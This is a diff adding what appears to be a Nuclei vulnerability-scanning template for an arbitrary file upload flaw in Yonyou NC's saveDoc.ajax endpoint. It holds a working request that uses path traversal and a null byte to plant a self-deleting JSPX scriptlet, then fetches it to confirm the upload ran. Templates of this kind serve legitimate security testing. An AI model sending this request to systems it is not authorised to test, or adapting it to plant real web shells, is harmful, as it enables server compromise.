@@ -1,0 +1,41 @@
+id: yonyou-nc-saveDoc-fileupload
+
+info:
+  name: 用友NC-saveDoc-任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    
+  reference:
+    - 
+  tags: File Upload
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+
+http:
+  - raw:
+      - |-
+        POST /uapws/saveDoc.ajax?ws=/../../{{file_name}}.jspx%00 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
+        Content-Type: application/x-www-form-urlencoded
+        
+        content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
+              <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
+          <hi:scriptlet>
+                    out.println("12321");new java.io.File(application.getRealPath(request.getServletPath())).delete();
+          </hi:scriptlet>
+        </hi>
+
+      - |
+        GET /uapws/{{file_name}}.jspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200 && contains_all(body,'12321')"
